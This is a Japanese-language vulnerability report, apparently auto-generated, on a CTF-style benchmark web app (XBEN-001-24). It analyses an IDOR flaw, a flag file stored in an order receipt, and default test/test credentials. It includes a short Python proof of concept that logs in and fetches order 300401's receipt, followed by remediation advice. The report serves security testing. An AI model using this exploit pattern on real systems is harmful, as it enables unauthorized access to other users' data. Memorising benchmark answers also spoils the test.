# Security Analysis: __init__.py - File operations resource

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-001-24/app/website/app/__init__.py`
- **検出パターン**: File operations resource

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `IDOR`
- `LFI`

## PAR Policy Analysis

### Principals (データ源)

- **order_id (URL parameter)**: Untrusted
  - Context: routes.py:94のURLパラメータから取得されるorder_id
  - Risk Factors: ユーザー制御可能, 認可チェックなし, 任意のIDを指定可能
- **session['user_id']**: SemiTrusted
  - Context: ログイン後にセッションに保存されるユーザーID
  - Risk Factors: 認証のみで認可なし, 存在チェックのみ
- **request.form['username'], request.form['password']**: Untrusted
  - Context: ログインフォームからの入力
  - Risk Factors: デフォルト認証情報（test/test）が存在

### Actions (セキュリティ制御)

- **session.get('user_id') チェック**: Insufficient
  - Function: ユーザーの認証状態を確認
  - Weaknesses: 認可チェックの欠如, ユーザーと注文の関連性検証なし
  - Bypass Vectors: 任意のorder_idを指定することで他ユーザーの注文にアクセス可能
- **Order.query.get(order_id)**: Missing
  - Function: データベースからOrderレコードを取得
  - Weaknesses: order.user_id == session['user_id']の検証なし
  - Bypass Vectors: 直接order_idを指定してアクセス

### Resources (操作対象)

- **open('/flag')**: Critical
  - Operation: ファイル読み込み
  - Protection: なし - ハードコードされたパス
- **Order.receipt (flag_content)**: Critical
  - Operation: データベースストレージ
  - Protection: 認証のみ（認可なし）
- **MySQL Database**: High
  - Operation: データベースアクセス
  - Protection: SQLAlchemyによるパラメータ化クエリ

### Policy Violations

#### AUTHZ-001: リソースアクセス時に所有者検証が必要

- **Path**: order_id (URL param) -> Order.query.get() -> order.receipt (containing flag)
- **Severity**: critical
- **Confidence**: 0.95

#### SENS-001: 機密ファイルの内容をデータベースに永続化すべきではない

- **Path**: open('/flag') -> flag_content -> Order.receipt -> DB
- **Severity**: critical
- **Confidence**: 0.95

#### CRED-001: デフォルト認証情報を本番環境で使用すべきではない

- **Path**: User(username='test', password='test') -> 認証バイパス
- **Severity**: high
- **Confidence**: 0.90

## マッチしたソースコード

```code
open('/flag')
```

## 詳細解析

このアプリケーションには**IDOR（Insecure Direct Object Reference）脆弱性**と**機密情報漏洩**が存在します。

### 脆弱性の概要

1. **機密ファイル読み込みと永続化**: `__init__.py`の85-86行目で`/flag`ファイルを読み込み、その内容をOrder ID 300401のreceiptフィールドにデータベースに保存しています。

2. **IDOR脆弱性**: `routes.py`の94-106行目の`/order/<int:order_id>/receipt`エンドポイントでは、認証されたユーザーであれば任意のorder_idを指定してOrderレコードにアクセスできます。コメント（99-103行目）にも明示的に「認可チェックが欠如しておりIDOR脆弱性が存在する」と記載されています。

3. **デフォルト認証情報**: test/testというデフォルト認証情報でログイン可能です。

### 攻撃パス
1. 攻撃者がtest/testでログイン
2. `/order/300401/receipt`にアクセス
3. フラグファイルの内容が含まれるレシートを取得

## PoC（概念実証コード）

```text
# PoC: IDOR脆弱性を利用したフラグ取得
import requests

BASE_URL = 'http://localhost:5000'

# セッションを作成
session = requests.Session()

# 1. ユーザー名でログイン
login_resp = session.post(f'{BASE_URL}/', data={'username': 'test'})

# 2. パスワードでログイン
password_resp = session.post(f'{BASE_URL}/password/test', data={'password': 'test'})

# 3. IDOR脆弱性を悪用してフラグが含まれるOrderにアクセス
# Order ID 300401はuser_idが設定されておらず、フラグ内容がreceiptに含まれている
receipt_resp = session.get(f'{BASE_URL}/order/300401/receipt')

print('Response Status:', receipt_resp.status_code)
print('Flag Receipt Content:')
print(receipt_resp.text)
```

## 修復ガイダンス

### /order/<int:order_id>/receipt エンドポイント

- **Required**: 認可チェックの追加
- **Guidance**: Order取得後に `if order.user_id != session['user_id']: return abort(403)` を追加して、現在のユーザーが注文の所有者であることを検証する
- **Priority**: critical

### __init__.py の初期化処理

- **Required**: 機密データのデータベース永続化を防止
- **Guidance**: フラグファイルの内容をデータベースに保存しない。テストデータに機密情報を含めない
- **Priority**: critical

### 認証システム

- **Required**: デフォルト認証情報の削除
- **Guidance**: test/testなどのデフォルト認証情報を本番環境で使用しない。強力なパスワードポリシーを実装する
- **Priority**: high

### パスワードストレージ

- **Required**: パスワードのハッシュ化
- **Guidance**: 平文パスワードではなく、bcryptなどを使用してパスワードをハッシュ化して保存する
- **Priority**: high

## 解析ノート

分析の概要:
1. __init__.pyで/flagファイルを読み込み、その内容をOrderレコードのreceiptフィールドに保存している
2. routes.pyの/order/<int:order_id>/receiptエンドポイントにIDOR脆弱性が存在
3. order_id=300401でフラグが含まれるOrderにアクセス可能
4. 認証は必要だがtest/testのデフォルト認証情報が存在
5. 認可チェックが欠如しており、任意のorder_idを指定して他ユーザーの注文レシートを閲覧可能

